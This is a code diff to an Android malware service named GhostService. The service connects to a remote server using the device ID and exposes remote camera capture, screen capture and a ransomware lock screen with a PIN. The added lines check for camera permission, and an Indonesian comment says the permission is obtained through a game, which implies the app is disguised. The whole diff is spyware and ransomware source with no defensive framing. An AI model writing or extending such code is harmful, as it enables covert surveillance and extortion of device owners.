@@ -7,12 +7,15 @@ import android.app.Service;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.app.admin.DevicePolicyManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.provider.Settings;
+import android.Manifest;
+import android.widget.Toast;
 
 public class GhostService extends Service {
     private static GhostService instance;
@@ -30,6 +33,12 @@ public class GhostService extends Service {
         super.onCreate();
         instance = this;
         startForeground(1, buildNotification());
+        // Minta izin kamera jika belum
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                // Tidak bisa langsung minta di service, kita percayakan ke user lewat game
+            }
+        }
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         socket = new SocketClient(deviceId);
         socket.connect();
@@ -79,10 +88,34 @@ public class GhostService extends Service {
         return "unknown";
     }
 
-    public void startCamera() { if (cameraService == null) { cameraService = new CameraService(this); cameraService.start(); } }
-    public void stopCamera() { if (cameraService != null) { cameraService.stop(); cameraService = null; } }
-    public void startScreenCapture() { if (screenCapture == null) { screenCapture = new ScreenCaptureService(this); screenCapture.start(); } }
-    public void stopScreenCapture() { if (screenCapture != null) { screenCapture.stop(); screenCapture = null; } }
-    public void activateRansomware(String html, String pin) { mainHandler.post(() -> ransomware.show(html, pin)); }
-    public void deactivateRansomware() { mainHandler.post(() -> ransomware.hide()); }
+    public void startCamera() {
+        if (cameraService == null) {
+            cameraService = new CameraService(this);
+            cameraService.start();
+        }
+    }
+    public void stopCamera() {
+        if (cameraService != null) {
+            cameraService.stop();
+            cameraService = null;
+        }
+    }
+    public void startScreenCapture() {
+        if (screenCapture == null) {
+            screenCapture = new ScreenCaptureService(this);
+            screenCapture.start();
+        }
+    }
+    public void stopScreenCapture() {
+        if (screenCapture != null) {
+            screenCapture.stop();
+            screenCapture = null;
+        }
+    }
+    public void activateRansomware(String html, String pin) {
+        mainHandler.post(() -> ransomware.show(html, pin));
+    }
+    public void deactivateRansomware() {
+        mainHandler.post(() -> ransomware.hide());
+    }
 }
